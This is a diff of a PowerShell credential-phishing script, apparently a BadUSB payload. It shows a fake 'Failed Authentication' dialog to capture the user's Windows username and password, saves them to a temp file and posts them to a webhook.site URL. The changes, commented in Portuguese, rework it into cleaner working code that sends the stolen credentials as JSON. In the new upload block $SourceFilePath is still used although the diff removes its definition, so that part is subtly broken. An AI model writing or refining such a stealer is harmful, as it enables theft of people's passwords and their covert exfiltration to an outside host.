@@ -1,5 +1,4 @@
 
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 $WebhookUrl = "https://webhook.site/75342571-78da-45fc-8f61-caf01ffc1f5f"
 
 
@@ -12,19 +11,16 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 #>
 
 function Get-Creds {
-do{
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-    Get-Creds
-}
-$creds = $cred.GetNetworkCredential() | fl
-return $creds
-  # ...
-
-  $done = $true
-} until ($done)
-
+    do {
+        $cred = $host.ui.PromptForCredential('Failed Authentication', '', [Environment]::UserDomainName + '\' + [Environment]::UserName, [Environment]::UserDomainName)
+        $password = $cred.GetNetworkCredential().Password
+        if ([string]::IsNullOrWhiteSpace($password)) {
+            [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
+            continue  # Use continue em vez de recursão para evitar stack overflow
+        }
+        $creds = $cred.GetNetworkCredential() | Out-String  # Use Out-String para texto puro
+        return $creds
+    } until ($true)  # Simplifique: loop até senha válida
 }
 
 #----------------------------------------------------------------------------------------------------
@@ -35,19 +31,12 @@ return $creds
 	This is to pause the script until a mouse movement is detected
 #>
 
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
+function Pause-Script {
+    Add-Type -AssemblyName System.Windows.Forms
+    $originalPOS = [System.Windows.Forms.Cursor]::Position
+    $o = New-Object -ComObject WScript.Shell
+    while ([System.Windows.Forms.Cursor]::Position -eq $originalPOS) {
+        Start-Sleep -Milliseconds 100  # Cheque mais rápido, sem toggle desnecessário
     }
 }
 
@@ -92,7 +81,7 @@ $creds = Get-Creds
 	This is to save the gathered credentials to a file in the temp directory
 #>
 
-echo $creds >> $env:TMP\$FileName
+$creds | Out-File -FilePath "$env:TMP\$FileName" -Encoding UTF8 -Append
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -102,14 +91,12 @@ echo $creds >> $env:TMP\$FileName
 	This is to upload your files to dropbox
 #>
 
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -InFile $SourceFilePath -Headers $headers
+
+$body = @{
+    filename = $FileName
+    content = Get-Content $SourceFilePath -Raw
+} | ConvertTo-Json
+Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType 'application/json'
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
